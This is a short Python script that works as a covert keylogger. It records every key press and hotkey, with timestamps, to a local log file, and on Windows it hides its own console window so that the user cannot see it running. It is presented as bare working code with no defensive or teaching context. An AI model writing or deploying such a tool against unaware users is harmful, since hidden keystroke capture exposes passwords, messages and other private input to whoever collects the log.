import os
import sys
import logging
from pynput import keyboard
from pathlib import Path

# Hide the console window on Windows
if os.name == 'nt':
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Log file path
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Track currently pressed keys
current_keys = set()

# Ctrl+[A-Z] ASCII map
ctrl_char_map = {
    '\x01': 'Ctrl + A', '\x02': 'Ctrl + B', '\x03': 'Ctrl + C', '\x04': 'Ctrl + D',
    '\x05': 'Ctrl + E', '\x06': 'Ctrl + F', '\x07': 'Ctrl + G', '\x08': 'Ctrl + H',
    '\x09': 'Ctrl + I (Tab)', '\x0A': 'Ctrl + J', '\x0B': 'Ctrl + K', '\x0C': 'Ctrl + L',
    '\x0D': 'Ctrl + M (Enter)', '\x0E': 'Ctrl + N', '\x0F': 'Ctrl + O', '\x10': 'Ctrl + P',
    '\x11': 'Ctrl + Q', '\x12': 'Ctrl + R', '\x13': 'Ctrl + S', '\x14': 'Ctrl + T',
    '\x15': 'Ctrl + U', '\x16': 'Ctrl + V', '\x17': 'Ctrl + W', '\x18': 'Ctrl + X',
    '\x19': 'Ctrl + Y', '\x1A': 'Ctrl + Z',
}

def describe_combo(keys):
    parts = []
    if keyboard.Key.ctrl_l in keys or keyboard.Key.ctrl_r in keys:
        parts.append("Ctrl")
    if keyboard.Key.shift in keys or keyboard.Key.shift_r in keys:
        parts.append("Shift")
    if keyboard.Key.alt_l in keys or keyboard.Key.alt_r in keys:
        parts.append("Alt")
    if keyboard.Key.cmd in keys:
        parts.append("Win")
    return " + ".join(parts)

def on_press(key):
    current_keys.add(key)

    # Stop logging when ESC is pressed
    if key == keyboard.Key.esc:
        logging.info("Escape key pressed. Exiting.")
        return False

    try:
        if key.char in ctrl_char_map:
            logging.info(f'Hotkey Detected: {ctrl_char_map[key.char]}')
        else:
            logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        combo_desc = describe_combo(current_keys)
        if combo_desc:
            logging.info(f'Combination Pressed: {combo_desc} + {key}')
        else:
            logging.info(f'Special key pressed: {key}')

def on_release(key):
    current_keys.discard(key)

# Start listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



